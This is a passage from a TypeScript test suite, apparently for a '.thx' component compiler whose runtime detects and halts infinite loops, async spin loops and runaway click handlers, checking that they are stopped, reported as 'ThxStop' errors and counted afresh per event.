  test("an await loop is stopped", () => stops("const spin = async () => { while (true) { await null; } }; spin();"));
  test("a then chain is stopped", () => stops("loop();", "function loop(): Promise<void> { return Promise.resolve(null).then(loop); }\n"));
  test("a loop after an await is stopped", () => stops("const go = async () => { await null; while (true) {} }; go();"));
  test("each entry from the host starts a fresh count", async () => {
    const r = compile({ "main.thx": element(`<button onClick={() => { let i = 0; while (i < 12000) { i++; } leak(i); }}>x</button>`) }, testOptions());
    assert.ok(r.ok);
    if (!r.ok) return;
    const app = await fakeApp(r.code, small);
    const [button] = app.render() as { props: Record<string, unknown> }[];
    (button.props.onClick as (e: unknown) => void)({});
    (button.props.onClick as (e: unknown) => void)({});
    assert.deepEqual(app.leaked, [12000, 12000]);
    assert.equal(app.rt.stopped, false);
  });
  test("a handler that spins is stopped and reported, not thrown at the page", async () => {
    const r = compile({ "main.thx": element(`<button onClick={() => { while (true) {} }}>x</button>`) }, testOptions());
    assert.ok(r.ok);
    if (!r.ok) return;
    const app = await fakeApp(r.code, small);
    const [button] = app.render() as { props: Record<string, unknown> }[];
    assert.doesNotThrow(() => (button.props.onClick as (e: unknown) => void)({}));
    assert.equal(app.rt.stopped, true);
    assert.equal(app.errors[0].name, "ThxStop");
  });
});
